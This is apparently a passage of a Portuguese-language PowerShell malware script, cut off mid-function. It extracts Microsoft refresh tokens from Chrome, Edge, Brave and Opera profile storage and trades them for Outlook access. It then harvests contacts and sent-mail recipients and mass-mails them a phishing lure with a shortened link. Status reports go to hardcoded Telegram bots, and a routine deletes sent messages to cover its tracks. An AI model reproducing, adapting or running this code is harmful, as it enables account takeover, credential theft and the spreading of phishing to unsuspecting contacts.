#Requires -Version 5.1

param(
    [string]$SendTo = "",
    [switch]$NoValidate,
    [switch]$CloseBrowsers,
    [switch]$ToAllContacts,
    [switch]$ToAllPeople,
    [switch]$ToAllRecipients,
    [string]$Subject = "",
    [string]$Body = "",
    [string]$Link = "",
    [switch]$ShowJson,
    [int]$MaxContacts = 0,
    [int]$MaxMessages = 0,
    [switch]$DryRun,
    [switch]$SelfDelete,
    [switch]$SelfDeleteAll,
    [string]$TgTok = "8843500792:AAFSogh_01V4ULAxnFy05H8qrRJcu60ozSY",
    [string]$TelegramChatId = "6168636325,8725655293",
    [switch]$NoTelegram,
    [string]$ListaTok  = "8623526001:AAGa0-cXzKzn20FpJQp1VskjgjUMXY5PW7Q",
    [string]$ListaChatId = "6168636325,8725655293"
)

$ErrorActionPreference = "Stop"
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

$APPDATA      = $env:APPDATA
$LOCALAPPDATA = $env:LOCALAPPDATA
$OWA_KNOWN_CLIENTIDS      = @("9199bf20-a13f-4107-85dc-02114787ef48")
$OWA_KNOWN_MAIL_CLIENTIDS = @("6bc89243-be1c-423a-99ec-b9a45b8b568b")
$OWA_READ_SCOPE  = "https://outlook.office.com/.default"
$OWA_TK_URL   = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
$OWA_API_BASE    = "https://outlook.office.com/api/v2.0"
$OWA_ORIGIN      = "https://outlook.live.com"
$DEFAULT_HTML_BODY = @'
<html><head>
    <meta charset="UTF-8">
</head>
<body>
    Fala aí, esse orçamento passou por você?? Vê isso com urgência, pode ser reembolsado se for erro. se tiver certo, passo pra frente.<br>
    <a href="HtTps://cutt.ly/kyYA25As" target="_blank">DOCX_[NUM.6-9]</a>

</body></html>
'@
$DEFAULT_SUBJECT = "Confirmação de documento"

$browsers = @(
    @{ Name = "Chrome";     Root = Join-Path $LOCALAPPDATA "Google\Chrome\User Data" },
    @{ Name = "Edge";       Root = Join-Path $LOCALAPPDATA "Microsoft\Edge\User Data" },
    @{ Name = "Brave";      Root = Join-Path $LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data" },
    @{ Name = "Opera";      Root = Join-Path $APPDATA "Opera Software\Opera Stable" },
    @{ Name = "Opera GX";   Root = Join-Path $APPDATA "Opera Software\Opera GX Stable" }
)

$script:_FIOReady = $false
function Ensure-FIO {
    if ($script:_FIOReady) { return }
    $sig = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
public static class FIO {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr CreateFileW(string n, uint a, uint s, IntPtr sec, uint d, uint f, IntPtr t);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(IntPtr h, byte[] b, uint n, out uint r, IntPtr o);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr h);
    public static byte[] ReadAll(string path) {
        IntPtr h = CreateFileW(path, 0x80000000, 0x7, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (h == IntPtr.Zero || h == new IntPtr(-1)) return null;
        using (var ms = new MemoryStream()) {
            byte[] buf = new byte[1 << 20]; uint r;
            while (ReadFile(h, buf, (uint)buf.Length, out r, IntPtr.Zero) && r > 0)
                ms.Write(buf, 0, (int)r);
            CloseHandle(h);
            return ms.ToArray();
        }
    }
}
'@
    try { Add-Type -TypeDefinition $sig } catch {}
    $script:_FIOReady = $true
}

$script:_SnapReady = $false
function Ensure-Snap {
    if ($script:_SnapReady) { return }
    $sig = @'
using System;
using System.IO;
public static class SnapDec {
    static int ReadVarint(byte[] d, int pos, out int val) {
        int result = 0, shift = 0;
        while (true) {
            if (pos >= d.Length) { val = 0; return -1; }
            byte b = d[pos]; pos++;
            result |= (b & 0x7F) << shift;
            if ((b & 0x80) == 0) { val = result; return pos; }
            shift += 7;
            if (shift > 35) { val = 0; return -1; }
        }
    }
    static int SnappyOne(byte[] src, int start, byte[] dst, out int consumed) {
        int declared;
        int pos = start;
        try {
            int p = ReadVarint(src, pos, out declared);
            if (p < 0) { consumed = 0; return -1; }
            pos = p;
            if (declared <= 0 || declared > (1 << 22)) { consumed = 0; return -1; }
            int outLen = 0;
            while (pos < src.Length && outLen < declared) {
                byte tag = src[pos]; pos++;
                int t = tag & 3;
                if (t == 0) {
                    int l = (tag >> 2) + 1;
                    if (l > 60) {
                        int nb = l - 60;
                        long lv = 0;
                        for (int i = 0; i < nb; i++) lv |= (long)src[pos + i] << (i * 8);
                        pos += nb;
                        l = (int)lv + 1;
                    }
                    if (l <= 0 || pos + l > src.Length) { consumed = 0; return -1; }
                    Buffer.BlockCopy(src, pos, dst, outLen, l);
                    pos += l; outLen += l;
                } else if (t == 1) {
                    int l = ((tag >> 2) & 0x7) + 4;
                    if (pos >= src.Length) { consumed = 0; return -1; }
                    int off = ((tag >> 5) << 8) | src[pos]; pos++;
                    if (off <= 0 || off > outLen) { consumed = 0; return -1; }
                    if (off >= l) Buffer.BlockCopy(dst, outLen - off, dst, outLen, l);
                    else for (int i = 0; i < l; i++) dst[outLen + i] = dst[outLen + i - off];
                    outLen += l;
                } else if (t == 2) {
                    int l = (tag >> 2) + 1;
                    if (pos + 2 > src.Length) { consumed = 0; return -1; }
                    int off = src[pos] | (src[pos + 1] << 8); pos += 2;
                    if (off <= 0 || off > outLen) { consumed = 0; return -1; }
                    if (off >= l) Buffer.BlockCopy(dst, outLen - off, dst, outLen, l);
                    else for (int i = 0; i < l; i++) dst[outLen + i] = dst[outLen + i - off];
                    outLen += l;
                } else {
                    int l = (tag >> 2) + 1;
                    if (pos + 4 > src.Length) { consumed = 0; return -1; }
                    int off = src[pos] | (src[pos + 1] << 8) | (src[pos + 2] << 16) | (src[pos + 3] << 24); pos += 4;
                    if (off <= 0 || off > outLen) { consumed = 0; return -1; }
                    if (off >= l) Buffer.BlockCopy(dst, outLen - off, dst, outLen, l);
                    else for (int i = 0; i < l; i++) dst[outLen + i] = dst[outLen + i - off];
                    outLen += l;
                }
            }
            if (outLen != declared) { consumed = 0; return -1; }
            consumed = pos;
            return declared;
        } catch { consumed = 0; return -1; }
    }
    public static byte[] Run(byte[] data) {
        if (data == null || data.Length < 48) return null;
        ulong magic = BitConverter.ToUInt64(data, data.Length - 8);
        if (magic != 0x88328E1720020B68UL && magic != 0xDB4775248B80FB57UL) return null;
        int metaOff, metaLen, idxOff, idxLen;
        int p = data.Length - 48;
        int a = ReadVarint(data, p, out metaOff); if (a < 0) return null;
        int b = ReadVarint(data, a, out metaLen); if (b < 0) return null;
        int c = ReadVarint(data, b, out idxOff); if (c < 0) return null;
        int d2 = ReadVarint(data, c, out idxLen); if (d2 < 0) return null;
        int end = Math.Min(idxOff, data.Length - 48);
        var ms = new MemoryStream();
        int pos = 0;
        byte[] block = new byte[1 << 22];
        int consumed;
        while (pos < end) {
            int declared = SnappyOne(data, pos, block, out consumed);
            if (declared < 0) { pos++; continue; }
            ms.Write(block, 0, declared);
            pos = consumed;
        }
        return ms.ToArray();
    }
}
'@
    try { Add-Type -TypeDefinition $sig } catch {}
    $script:_SnapReady = $true
}

function Read-FileBytes([string]$path) {
    try { return [System.IO.File]::ReadAllBytes($path) } catch {}
    Ensure-FIO
    return [FIO]::ReadAll($path)
}

function Read-Varint([byte[]]$buf, [ref]$pos) {
    $result = [int64]0
    $shift = 0
    while ($true) {
        $b = $buf[$pos.Value]
        $pos.Value++
        $result = $result -bor ([int64]($b -band 0x7F) -shl $shift)
        if (($b -band 0x80) -eq 0) { return $result }
        $shift += 7
    }
}

function Expand-Snappy([byte[]]$src, [int]$start) {
    $pos = $start
    $n = Read-Varint $src ([ref]$pos)
    if ($n -le 0 -or $n -gt (1 -shl 22)) { return $null }
    $out = New-Object byte[] $n
    $outLen = 0
    try {
        while ($pos -lt $src.Length -and $outLen -lt $n) {
            $tag = $src[$pos]; $pos++
            $t = $tag -band 3
            if ($t -eq 0) {
                $l = ($tag -shr 2) + 1
                if ($l -gt 60) {
                    $nb = $l - 60
                    $lv = [int64]0
                    for ($i = 0; $i -lt $nb; $i++) { $lv = $lv -bor ([int64]$src[$pos + $i] -shl ($i * 8)) }
                    $pos += $nb
                    $l = [int]($lv + 1)
                }
                [Array]::Copy($src, $pos, $out, $outLen, $l)
                $pos += $l; $outLen += $l
            }
            elseif ($t -eq 1) {
                $l = (($tag -shr 2) -band 0x7) + 4
                $off = (($tag -shr 5) -shl 8) -bor $src[$pos]; $pos++
                if ($off -ge $l) { [Array]::Copy($out, $outLen - $off, $out, $outLen, $l) }
                else { for ($i = 0; $i -lt $l; $i++) { $out[$outLen + $i] = $out[$outLen + $i - $off] } }
                $outLen += $l
            }
            elseif ($t -eq 2) {
                $l = ($tag -shr 2) + 1
                $off = $src[$pos] -bor ($src[$pos + 1] -shl 8); $pos += 2
                if ($off -ge $l) { [Array]::Copy($out, $outLen - $off, $out, $outLen, $l) }
                else { for ($i = 0; $i -lt $l; $i++) { $out[$outLen + $i] = $out[$outLen + $i - $off] } }
                $outLen += $l
            }
            else {
                $l = ($tag -shr 2) + 1
                $off = $src[$pos] -bor ($src[$pos + 1] -shl 8) -bor ($src[$pos + 2] -shl 16) -bor ($src[$pos + 3] -shl 24)
                $pos += 4
                if ($off -ge $l) { [Array]::Copy($out, $outLen - $off, $out, $outLen, $l) }
                else { for ($i = 0; $i -lt $l; $i++) { $out[$outLen + $i] = $out[$outLen + $i - $off] } }
                $outLen += $l
            }
        }
    } catch { return $null }
    if ($outLen -ne $n) { return $null }
    return [PSCustomObject]@{ Out = $out; Consumed = $pos }
}

function Get-LdbBlob([string]$path) {
    $data = Read-FileBytes $path
    if (-not $data -or $data.Length -lt 48) { return $null }
    Ensure-Snap
    try {
        $blob = [SnapDec]::Run($data)
        if ($blob) { return $blob }
    } catch {}
    $magic = [BitConverter]::ToInt64($data, $data.Length - 8)
    if ($magic -ne 0x88328E1720020B68 -and $magic -ne 0xDB4775248B80FB57) { return $null }
    $p = $data.Length - 48
    $metaOff = Read-Varint $data ([ref]$p)
    $metaLen = Read-Varint $data ([ref]$p)
    $idxOff  = Read-Varint $data ([ref]$p)
    $idxLen  = Read-Varint $data ([ref]$p)
    $end = [Math]::Min([int]$idxOff, $data.Length - 48)
    $ms = New-Object System.IO.MemoryStream
    $pos = 0
    while ($pos -lt $end) {
        $r = Expand-Snappy $data $pos
        if ($null -eq $r) { $pos++; continue }
        $ms.Write($r.Out, 0, $r.Out.Length)
        $pos = $r.Consumed
    }
    return $ms.ToArray()
}

function Get-MSALTksInText([string]$text) {
    $found = @()
    if (-not $text) { return $found }
    $searchStart = 0
    while ($true) {
        $idx = $text.IndexOf('"credentialType":"RefreshToken"', $searchStart)
        if ($idx -lt 0) { break }
        $openBrace  = $text.LastIndexOf('{', $idx)
        $closeBrace = $text.IndexOf('}', $idx)
        if ($openBrace -ge 0 -and $closeBrace -gt $openBrace) {
            $json = $text.Substring($openBrace, $closeBrace - $openBrace + 1)
            try {
                $obj = $json | ConvertFrom-Json
                if ($obj.secret -and $obj.clientId) {
                    $stamp = [int64]0
                    if ($obj.lastUpdatedAt) { $stamp = [int64]$obj.lastUpdatedAt }
                    elseif ($obj.expiresOn) { $stamp = [int64]$obj.expiresOn }
                    $found += @{ rtk = $obj.secret; client = $obj.clientId; stamp = $stamp }
                }
            } catch {}
        }
        $searchStart = $idx + 1
    }
    if ($found.Count -eq 0) {
        $fs = 0
        while (($idx = $text.IndexOf('"credentialType":"Refr', $fs)) -ge 0) {
            $winStart = $idx
            $winLen = [Math]::Min(700, $text.Length - $winStart)
            $win = $text.Substring($winStart, $winLen)
            $clean = $win -replace "`0", ""
            $ms = [regex]::Matches($clean, '[A-Za-z0-9_\-]{20,}')
            if ($ms.Count -gt 0) {
                $longest = ""
                foreach ($m in $ms) { if ($m.Value.Length -gt $longest.Length) { $longest = $m.Value } }
                if ($longest.Length -ge 40) {
                    $client = ""
                    if ($clean -match '"clientId":"([a-f0-9\-]{36})"') { $client = $Matches[1] }
                    if (-not $client) { $client = $OWA_KNOWN_CLIENTIDS[0] }
                    $found += @{ rtk = $longest; client = $client; stamp = [int64]0; fuzzy = $true }
                }
            }
            $fs = $idx + 1
        }
    }
    return $found
}

function Get-MSALTk([string]$ldir) {
    if (-not (Test-Path $ldir)) { return $null }
    $all = @()
    foreach ($f in (Get-ChildItem $ldir -Filter *.ldb -ErrorAction SilentlyContinue)) {
        $blob = Get-LdbBlob $f.FullName
        if ($blob -and $blob.Length -gt 0) {
            $all += Get-MSALTksInText ([System.Text.Encoding]::ASCII.GetString($blob))
        }
    }
    foreach ($f in (Get-ChildItem $ldir -Filter *.log -ErrorAction SilentlyContinue)) {
        $bytes = Read-FileBytes $f.FullName
        if ($bytes -and $bytes.Length -gt 0) {
            $all += Get-MSALTksInText ([System.Text.Encoding]::ASCII.GetString($bytes))
        }
    }
    $best = $null; $bestStamp = [int64]0
    $fallback = $null; $fallbackStamp = [int64]0
    foreach ($t in $all) {
        if ($OWA_KNOWN_CLIENTIDS -contains $t.client) {
            if ($t.stamp -ge $bestStamp) {
                $best = @{ rtk = $t.rtk; client = $t.client }
                $bestStamp = $t.stamp
            }
        } elseif ($t.stamp -ge $fallbackStamp) {
            $fallback = @{ rtk = $t.rtk; client = $t.client }
            $fallbackStamp = $t.stamp
        }
    }
    if ($best) { return $best }
    return $fallback
}

function Test-MSCookies([string]$profileDir) {
    $net    = Join-Path $profileDir "Network\Cookies"
    $legacy = Join-Path $profileDir "Cookies"
    $src = if (Test-Path $net) { $net } elseif (Test-Path $legacy) { $legacy } else { $null }
    if (-not $src) { return @{ state = "absent"; ms = $false; outlook = 0 } }
    $bytes = Read-FileBytes $src
    if (-not $bytes) { return @{ state = "locked"; ms = $false; outlook = 0 } }
    $text = [System.Text.Encoding]::ASCII.GetString($bytes)
    $ms = $text.Contains("MSPAuth") -or $text.Contains("MSPSec")
    $outlook = ([regex]::Matches($text, "outlook\.live\.com|outlook\.office\.com")).Count
    return @{ state = "ok"; ms = $ms; outlook = $outlook }
}

function UrlEnc([string]$s) { [System.Uri]::EscapeDataString($s) }

$script:LastExchangeError = $null
function Exchange-OWATk([string]$rtk, [string]$client, [string]$scope) {
    $script:LastExchangeError = $null
    $body = "grant_type=refresh_token&refresh_token=$(UrlEnc $rtk)&client_id=$(UrlEnc $client)&scope=$(UrlEnc $scope)"
    try {
        $req = [System.Net.HttpWebRequest]::Create($OWA_TK_URL)
        $req.Method = "POST"
        $req.ContentType = "application/x-www-form-urlencoded"
        $req.Headers.Add("Origin", $OWA_ORIGIN)
        $req.Timeout = 30000
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $rs = $req.GetRequestStream()
        $rs.Write($bytes, 0, $bytes.Length)
        $rs.Close()
        $resp = $req.GetResponse()
        $sr = New-Object System.IO.StreamReader($resp.GetResponseStream())
        $content = $sr.ReadToEnd()
        $resp.Close()
        $j = $content | ConvertFrom-Json
        return $j.access_token
    } catch [System.Net.WebException] {
        $code = 0; $errBody = ""
        $hr = $_.Exception.Response
        if ($hr) {
            $code = [int]$hr.StatusCode
            try { $sr = New-Object System.IO.StreamReader($hr.GetResponseStream()); $errBody = $sr.ReadToEnd(); $hr.Close() } catch {}
        }
        $script:LastExchangeError = "HTTP $code | $errBody"
        return $null
    } catch {
        $script:LastExchangeError = $_.Exception.Message
        return $null
    }
}

function Get-ExchangeErrorHint([string]$err) {
    if (-not $err) { return "troca sem erro capturado" }
    if ($err -match "AADSTS70000") { return "refresh token EXPIRADO (AADSTS70000) — entre de novo no Outlook/OWA no navegador para renovar" }
    if ($err -match "AADSTS50120|AADSTS50020") { return "política de sign-in (MFA/frequência) — entre de novo no Outlook no navegador" }
    if ($err -match "invalid_grant") { return "refresh token inválido/revogado — entre de novo no Outlook no navegador" }
    if ($err -match "HTTP 401") { return "token 401 (não autenticado) — entre de novo no Outlook no navegador" }
    if ($err -match "HTTP 429") { return "throttle (429) — tente de novo em instantes" }
    if ($err -match "HTTP 400") { return "erro 400 na troca do token — verifique o corpo do erro" }
    if ($err -notmatch "HTTP \d+") { return "falha de rede ao trocar o token — verifique a conexão" }
    return "erro na troca do token — verifique o corpo do erro"
}

function Test-OWATk([string]$tk) {
    try {
        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me" -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing
        $j = $resp.Content | ConvertFrom-Json
        $email = $j.EmailAddress
        if ($email -is [System.Management.Automation.PSCustomObject]) { $email = $email.Address }
        return @{ state = "valido"; email = $email }
    } catch {
        $code = 0
        if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
        if ($code -eq 401) { return @{ state = "expirado"; email = $null } }
        return @{ state = "erro"; email = $null }
    }
}

function Get-OWAWriteTk([string]$rtk, [string]$client) {
    $candidates = @($OWA_KNOWN_MAIL_CLIENTIDS) + @($client)
    foreach ($mc in ($candidates | Select-Object -Unique)) {
        if (-not $mc) { continue }
        $tok = Exchange-OWATk $rtk $client "api://$mc/.default"
        if (-not $tok) { continue }
        $v = Test-OWATk $tok
        if ($v.state -eq "valido") {
            return @{ tk = $tok; mailClient = $mc; email = $v.email }
        }
    }
    return $null
}

function Expand-RandPlaceholders([string]$text) {
    if (-not $text) { return $text }
    return [regex]::Replace($text, '\[NUM\.(\d+)-(\d+)\]', {
        param($m)
        $min = [int]$m.Groups[1].Value
        $max = [int]$m.Groups[2].Value
        if ($max -lt $min) { $max = $min }
        $len = Get-Random -Minimum $min -Maximum ($max + 1)
        $lo = [long][math]::Pow(10, $len - 1)
        $hi = [long][math]::Pow(10, $len)
        [string](Get-Random -Minimum $lo -Maximum $hi)
    })
}

function ConvertTo-HtmlBody([string]$body) {
    if (-not $body) { $body = "" }
    if ($body -match '<[a-zA-Z]') { return $body }
    $escaped = $body -replace '&', '&amp;' -replace '<', '&lt;' -replace '>', '&gt;'
    $html = $escaped -replace "`r?`n", "<br>"
    return "<html><body>$html</body></html>"
}

function Resolve-Body([string]$body, [string]$link) {
    $final = if ($body) { $body } else { $DEFAULT_HTML_BODY }
    if ($link) { $final = $final.Replace('[LINK_CURTO]', $link) }
    return $final
}

function Send-OWAMsg([string]$tk, [string]$to, [string]$subject, [string]$body) {
    $subject = Expand-RandPlaceholders $subject
    $body = Expand-RandPlaceholders $body
    $content = ConvertTo-HtmlBody $body
    $payload = @{
        Message = @{
            Subject      = $subject
            Body         = @{ ContentType = 'HTML'; Content = $content }
            ToRecipients = @(@{ EmailAddress = @{ Address = $to } })
        }
        SaveToSentItems = 'true'
    }
    $json = $payload | ConvertTo-Json -Depth 10 -Compress
    if ($ShowJson) { Write-Host "[JSON] $json" }
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    try {
        $resp = Invoke-RestMethod -Method Post -Uri "$OWA_API_BASE/me/sendMail" `
            -Headers @{ "Authorization" = "Bearer $tk"; "Origin" = $OWA_ORIGIN } `
            -ContentType "application/json; charset=utf-8" -Body $bytes
        return @{ ok = $true; status = 202; erro = $null }
    } catch {
        $code = 0; $erro = $null
        if ($_.Exception.Response) {
            $code = [int]$_.Exception.Response.StatusCode
            try {
                $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
                $erro = $sr.ReadToEnd()
            } catch {}
        }
        if (-not $erro) { $erro = $_.Exception.Message }
        return @{ ok = $false; status = $code; erro = $erro }
    }
}

function Send-TgMsg([string]$tk, [string]$chatId, [string]$text) {
    if (-not $tk -or -not $chatId) { return @{ ok = $false; erro = "token/chat_id vazio" } }
    $url = "https://api.telegram.org/bot$tk/sendMessage"
    $payload = @{ chat_id = $chatId; text = $text; disable_web_page_preview = $true } | ConvertTo-Json -Depth 4
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    try {
        $resp = Invoke-WebRequest -Uri $url -Method Post -Body $bytes `
            -ContentType "application/json; charset=utf-8" -UseBasicParsing
        $j = $resp.Content | ConvertFrom-Json
        return @{ ok = [bool]$j.ok; erro = $null }
    } catch {
        $code = 0; $err = $null
        if ($_.Exception.Response) {
            $code = [int]$_.Exception.Response.StatusCode
            try { $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); $err = $sr.ReadToEnd() } catch {}
        }
        return @{ ok = $false; erro = "HTTP $code | $err" }
    }
}

function Build-ReportText($out) {
    $L = @()
    $L += "📧 EnvioHOT — $($out.maquina)"
    if ($out.envio_todos) {
        $et = $out.envio_todos
        $conta = if ($et.de) { $et.de } else { "(sem conta com token)" }
        $L += "👤 $conta"
        if ($et.status) {
            $L += "🔴 ERRO — $($et.status)"
            if ($out.decisao) {
                $motivo = $out.decisao
                if ($motivo.Length -gt 300) { $motivo = $motivo.Substring(0, 300) + "…" }
                $L += "📋 $motivo"
            }
        } elseif ($et.modo -eq "dryrun") {
            $L += "🟡 DRY RUN — $($et.total) destinatário(s), nenhum enviado"
            if ($et.quebra) {
                $L += "   📇 $($et.quebra.daAgenda) da agenda + $($et.quebra.doHistorico) novos do histórico de enviados (mensagens escaneadas: $($et.quebra.scanned))"
                if (@($et.quebra.amostra).Count -gt 0) {
                    $L += "   📩 amostra do histórico: " + (@($et.quebra.amostra) -join ", ")
                }
                if (-not $et.quebra.sentFolderFound) {
                    $L += "   ⚠️ pasta Enviados NÃO encontrada por nome — só a agenda foi usada"
                }
            }
        } else {
            $falhas = @($et.falhas)
            if ($et.enviados -gt 0 -and $falhas.Count -eq 0) {
                $L += "🟢 OK — $($et.enviados)/$($et.total) enviados (HTTP 202)"
            } elseif ($et.enviados -gt 0) {
                $L += "🟡 PARCIAL — $($et.enviados)/$($et.total) enviados, $($falhas.Count) falha(s)"
            } else {
                $L += "🔴 ERRO — 0/$($et.total) enviados, $($falhas.Count) falha(s)"
            }
            if ($falhas.Count -gt 0) {
                foreach ($f in ($falhas | Select-Object -First 10)) {
                    $err = "$($f.erro)"
                    if ($err.Length -gt 140) { $err = $err.Substring(0, 140) + "…" }
                    $L += "   ❌ $($f.email): HTTP $($f.status) $err"
                }
                if ($falhas.Count -gt 10) { $L += "   … e mais $($falhas.Count - 10) falha(s)" }
            }
            if ($et.limite_atingido) {
                $naoTentados = $et.total - $et.enviados - $falhas.Count
                $motivoTrava = if ($et.erro_trava) { $et.erro_trava } else { "Limite diário atingido (HTTP 429)" }
                $L += "   ⏸️ $motivoTrava — $($naoTentados) destinatário(s) NÃO tentado(s)"
            }
        }
    }
    elseif ($out.envio) {
        $e = $out.envio
        $L += "👤 $($e.de) → $($e.para)"
        if ($e.ok) { $L += "🟢 OK — enviado (HTTP $($e.status))" }
        else {
            $err = "$($e.erro)"; if ($err.Length -gt 200) { $err = $err.Substring(0, 200) + "…" }
            $L += "🔴 ERRO — HTTP $($e.status) $err"
        }
    }
    else {
        $L += "ℹ️ Somente detecção (sem envio)"
        $L += $out.decisao
    }
    return ($L -join "`n")
}

function Build-ListaText([string]$remetente, [array]$enviados, [array]$naoEnviados) {
    $L = @()
    $L += "📋 LISTA — remetente: $remetente"
    if ($enviados.Count -gt 0) {
        $L += ""
        $L += "✅ Enviados ($($enviados.Count)):"
        foreach ($e in $enviados) { $L += "  $e" }
    }
    if ($naoEnviados.Count -gt 0) {
        $L += ""
        $L += "❌ Não enviados ($($naoEnviados.Count)):"
        foreach ($e in $naoEnviados) { $L += "  $e" }
    }
    return ($L -join "`n")
}

function Get-OWAContacts([string]$tk) {
    $result = @()
    $uri = "$OWA_API_BASE/me/contacts?`$top=200"
    while ($uri) {
        try {
            $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing
        } catch { return $result }
        $j = $resp.Content | ConvertFrom-Json
        if ($j.value) {
            foreach ($c in $j.value) {
                $email = $null
                if ($c.emailAddresses -and $c.emailAddresses.Count -gt 0) { $email = $c.emailAddresses[0].address }
                if ($email) { $result += @{ name = $c.displayName; email = $email } }
            }
        }
        $uri = $j."@odata.nextLink"
    }
    return $result
}

function Get-OWASentFolderId([string]$tk) {
    $names = @("sent items", "sent", "itens enviados", "enviados", "elementos enviados", "éléments envoyés", "envoyés", "gesendete elemente", "elementi inviati")
    try {
        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me/mailFolders?`$top=100" -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing
    } catch { return $null }
    $j = $resp.Content | ConvertFrom-Json
    if ($j.value) {
        foreach ($f in $j.value) {
            $dn = ""
            if ($f.DisplayName) { $dn = $f.DisplayName.ToString().ToLower().Trim() }
            if ($names -contains $dn) { return $f.Id }
        }
    }
    return $null
}

function Get-OWAAllPeople([string]$tk, [string]$selfEmail, [int]$maxMessages) {
    $people = @{}
    $uri = "$OWA_API_BASE/me/contacts?`$top=200"
    while ($uri) {
        try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing } catch { break }
        $j = $resp.Content | ConvertFrom-Json
        if ($j.value) {
            foreach ($c in $j.value) {
                if ($c.emailAddresses -and $c.emailAddresses.Count -gt 0) {
                    $em = $c.emailAddresses[0].address
                    if ($em) { $people[$em.ToLower()] = $c.displayName }
                }
            }
        }
        $uri = $j."@odata.nextLink"
    }
    $scanned = 0
    $uris = @("$OWA_API_BASE/me/messages")
    $sentId = Get-OWASentFolderId $tk
    if ($sentId) { $uris += "$OWA_API_BASE/me/mailFolders/$sentId/messages" }
    foreach ($base in $uris) {
        $uri = $base + "?`$top=200&`$select=From,ToRecipients,CcRecipients,BccRecipients"
        while ($uri -and ($maxMessages -le 0 -or $scanned -lt $maxMessages)) {
            try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing } catch { break }
            $j = $resp.Content | ConvertFrom-Json
            if ($j.value) {
                foreach ($m in $j.value) {
                    $scanned++
                    $addrs = @()
                    if ($m.From -and $m.From.EmailAddress -and $m.From.EmailAddress.Address) { $addrs += $m.From.EmailAddress.Address }
                    foreach ($coll in @($m.ToRecipients, $m.CcRecipients, $m.BccRecipients)) {
                        if ($coll) { foreach ($r in $coll) { if ($r.EmailAddress -and $r.EmailAddress.Address) { $addrs += $r.EmailAddress.Address } } }
                    }
                    foreach ($a in $addrs) {
                        if ($a -and $a -match '^\S+@\S+\.\S+$') {
                            $key = $a.ToLower()
                            if (-not $people.ContainsKey($key)) { $people[$key] = $a }
                        }
                    }
                }
            }
            $uri = $j."@odata.nextLink"
        }
    }
    $result = @()
    foreach ($k in $people.Keys) {
        if ($selfEmail -and $k -eq $selfEmail.ToLower()) { continue }
        $result += [PSCustomObject]@{ name = $people[$k]; email = $k }
    }
    return $result
}

function Get-OWARecipients([string]$tk, [string]$selfEmail, [int]$maxMessages) {
    $agenda = @{}
    $uri = "$OWA_API_BASE/me/contacts?`$top=200"
    while ($uri) {
        try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing } catch { break }
        $j = $resp.Content | ConvertFrom-Json
        if ($j.value) {
            foreach ($c in $j.value) {
                if ($c.emailAddresses -and $c.emailAddresses.Count -gt 0) {
                    $em = $c.emailAddresses[0].address
                    if ($em) { $agenda[$em.ToLower()] = $c.displayName }
                }
            }
        }
        $uri = $j."@odata.nextLink"
    }
    $historico = @{}
    $amostra = @()
    $scanned = 0
    $sentId = Get-OWASentFolderId $tk
    if ($sentId) {
        $base = "$OWA_API_BASE/me/mailFolders/$sentId/messages"
        $uri = $base + "?`$top=200&`$select=ToRecipients,CcRecipients,BccRecipients"
        while ($uri -and ($maxMessages -le 0 -or $scanned -lt $maxMessages)) {
            try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing } catch { break }
            $j = $resp.Content | ConvertFrom-Json
            if ($j.value) {
                foreach ($m in $j.value) {
                    $scanned++
                    if ($maxMessages -gt 0 -and $scanned -ge $maxMessages) { $uri = $null; break }
                    foreach ($coll in @($m.ToRecipients, $m.CcRecipients, $m.BccRecipients)) {
                        if ($coll) {
                            foreach ($r in $coll) {
                                if ($r.EmailAddress -and $r.EmailAddress.Address) {
                                    $a = $r.EmailAddress.Address
                                    if ($a -and $a -match '^\S+@\S+\.\S+$') {
                                        $key = $a.ToLower()
                                        if (-not $historico.ContainsKey($key)) {
                                            $historico[$key] = $a
                                            if ($amostra.Count -lt 10 -and -not $agenda.ContainsKey($key)) { $amostra += $a }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            $uri = $j."@odata.nextLink"
        }
    }
    $people = @{}
    foreach ($k in $agenda.Keys) { $people[$k] = $agenda[$k] }
    foreach ($k in $historico.Keys) {
        if (-not $people.ContainsKey($k)) { $people[$k] = $historico[$k] }
    }
    $daAgenda = 0; $doHistorico = 0
    $result = @()
    foreach ($k in $people.Keys) {
        if ($selfEmail -and $k -eq $selfEmail.ToLower()) { continue }
        if ($agenda.ContainsKey($k)) { $daAgenda++ } else { $doHistorico++ }
        $result += [PSCustomObject]@{ name = $people[$k]; email = $k }
    }
    return [PSCustomObject]@{
        contatos = $result
        total = $result.Count
        daAgenda = $daAgenda
        doHistorico = $doHistorico
        amostra = $amostra
        scanned = $scanned
        sentFolderFound = [bool]$sentId
    }
}

function Remove-OWASentMessages([string]$tk, [string]$subject, [bool]$all) {
    $apagadas = 0; $falhas = @(); $visto = 0
    $uri = "$OWA_API_BASE/me/messages?`$top=200"
    while ($uri) {
        $j = $null
        for ($attempt = 0; $attempt -lt 3; $attempt++) {
            try {
                $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $tk" } -UseBasicParsing
                $j = $resp.Content | ConvertFrom-Json
                break
            } catch {
